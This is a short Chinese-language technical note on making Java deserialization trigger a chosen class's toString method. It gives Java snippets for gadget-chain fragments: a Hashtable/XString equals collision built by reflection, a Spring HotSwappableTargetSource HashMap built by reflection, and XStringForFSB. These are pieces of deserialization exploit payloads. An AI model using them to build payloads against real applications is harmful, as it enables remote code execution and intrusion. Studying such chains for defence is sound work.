# 如何在反序列化的时候触发指定类的toString方法呢？

`先说jdk自带的类`

1、jdk反序列化可控参数直接toString

## BadAttributeValueExpException

略过。

2、Xstring结合equal触发

## Hashtable

```java
        XString xString = new XString("");
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        innerMap1.put("yy",xString);
        innerMap1.put("zZ",userMap);

        innerMap2.put("zZ",xString);
        innerMap2.put("yy",userMap);

        Hashtable hashtable = new Hashtable();
        hashtable.put(innerMap1, 1);
        //hashtable.put(innerMap2, 2);
        Method addEntry = hashtable.getClass().getDeclaredMethod("addEntry",int.class,Object.class,Object.class,int.class);
        addEntry.setAccessible(true);
        addEntry.invoke(hashtable,innerMap2.hashCode(),innerMap2,2,2);
```

`非jdk自带的类`

## HotSwappableTargetSource

如果项目中有此类。（`jar包`:spring-aop-5.3.23.jar）这里只是举个例子。

```java
		HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
       	 HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object, Object> s = new HashMap<>();
//        s.put(v1,1);
//        s.put(v2,2); 反射不调用put
        Class<?> aClass1 = Class.forName("java.util.HashMap");
        Field size = aClass1.getDeclaredField("size");
        size.setAccessible(true);
        size.set(s, 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, 1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, 2, null));

        Field table = aClass1.getDeclaredField("table");
        table.setAccessible(true);
        table.set(s, tbl);
```

3、XStringForFSB（其实跟Xstring类似，因为本身就继承了Xstring，用处不大）结合equal触发

```java
XStringForFSB xStringForFSB = new XStringForFSB(new FastStringBuffer(),0,0);
```
